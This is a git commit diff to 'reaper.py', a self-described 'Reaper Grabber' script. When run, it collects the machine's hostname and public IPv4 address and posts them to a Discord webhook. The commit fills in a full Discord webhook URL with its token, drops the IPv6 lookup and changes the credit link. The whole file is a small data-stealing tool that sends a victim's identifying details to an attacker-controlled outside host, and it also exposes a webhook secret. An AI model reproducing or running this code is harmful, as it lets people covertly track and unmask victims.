f1893bac239debb45e5ab88720b78d888d2b226a
razu <57553476+rqzu@users.noreply.github.com>
2020-07-15 21:33:39 +1000

    Update reaper.py

--- reaper.py
+++ reaper.py
@@ -1,19 +1,18 @@
 import requests
 import socket
 
-#! Made by https://github.com/rqzu/Reaper-Grabber
+#! Made by https://github.com/nullylol/Reaper-Grabber
 
-webhook = "webhook_here" #!  Webhook goes here
+webhook = "https://discordapp.com/api/webhooks/726809766004916224/3CvVJeP_93PymzYcn1Y8wCYmjl6JHU2o-kRJq1yOFANAWsV4Qt25VBMsN7N70gM4JMYD" #!  Webhook goes here
 
 def Collect():
 
     pcname = socket.gethostname() #! Grabs PC Name
 
     r = requests.get('https://ipv4bot.whatismyipaddress.com').text #! Visits IPV4 Website
-    g = requests.get('https://ipv6bot.whatismyipaddress.com').text #! Visits IPV6 Website
 
     payloads = {
-        "content" : f"```asciidoc\nGrabbed With Reaper Grabber.\nIP Report for :: {pcname}\nIPV4 :: {r}\nIPv6 :: {g}```", #! Don't touch anything here tbh
+        "content" : f"```asciidoc\nGrabbed With Reaper Grabber.\nIP Report for :: {pcname}\nIPV4 :: {r}```", #! Don't touch anything here tbh
         "username" : "Reaper Grabber", #! Username for webhook
         "avatar_url" : "https://upload.wikimedia.org/wikipedia/commons/6/6a/Reaper.png", #! Profile Picture For Webhook (eg. https://www.ascii.wtf/ascii.png)
     }
